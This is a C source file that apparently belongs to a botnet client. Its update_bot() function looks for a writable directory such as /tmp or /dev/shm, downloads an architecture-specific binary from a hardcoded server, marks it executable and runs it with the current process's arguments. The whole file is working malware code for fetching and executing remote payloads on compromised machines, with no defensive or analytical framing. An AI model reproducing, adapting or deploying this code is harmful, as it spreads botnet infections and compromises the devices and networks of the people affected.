#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include "headers/utils.h"


#include "headers/scanner.h"

static const char *get_writable_dir() {
    if (access("/tmp", W_OK) == 0) return "/tmp";
    if (access("/var", W_OK) == 0) return "/var";
    if (access("/dev/shm", W_OK) == 0) return "/dev/shm";
    return ".";
}

int update_bot() {
    const char *arch = STR(ARCH_STR);
    const char *binsrv = BINSERVER_RELIABLE;
    char ip[64] = {0};
    char port[16] = {0};
    char execpath[256];
    char binpath[128];
    strncpy(ip, binsrv, sizeof(ip)-1);
    char *colon = strchr(ip, ':');
    if (colon) {
        *colon = 0;
        strncpy(port, colon+1, sizeof(port)-1);
    } else {
        strncpy(port, "80", sizeof(port)-1);
    }
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(port));
    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
        close(sock);
        return -1;
    }
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    char req[256];
    snprintf(req, sizeof(req), "GET /%s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n", arch, ip);
    if (send(sock, req, strlen(req), 0) < 0) {
        close(sock);
        return -1;
    }
    snprintf(binpath, sizeof(binpath), "%s/%s", get_writable_dir(), arch);
    int fd = open(binpath, O_CREAT|O_WRONLY|O_TRUNC, 0755);
    if (fd < 0) {
        close(sock);
        return -1;
    }
    char buf[4096];
    int in_body = 0;
    ssize_t r;
    while ((r = recv(sock, buf, sizeof(buf), 0)) > 0) {
        char *data = buf;
        ssize_t len = r;
        if (!in_body) {
            char *body = strstr(buf, "\r\n\r\n");
            if (body) {
                body += 4;
                len -= (body - buf);
                data = body;
                in_body = 1;
            } else {
                continue;
            }
        }
        write(fd, data, len);
    }
    close(fd);
    close(sock);
    chmod(binpath, 0755);
    snprintf(execpath, sizeof(execpath), "%s/%s", get_writable_dir(), arch);
    char cmd[512];
    FILE *f = fopen("/proc/self/cmdline", "rb");
    char args[1024] = {0};
    if (f) {
        size_t n = fread(args, 1, sizeof(args) - 1, f);
        fclose(f);
        for (size_t i = 0; i < n - 1; ++i) {
            if (args[i] == '\0') args[i] = ' ';
        }
        args[n] = 0;
    }
    char *argstr = args;
    while (*argstr && *argstr != ' ') argstr++;
    if (*argstr == ' ') argstr++;
    if (*argstr)
        snprintf(cmd, sizeof(cmd), "%s %s", execpath, argstr);
    else
        snprintf(cmd, sizeof(cmd), "%s", execpath);
    system(cmd);
    return 0;
}
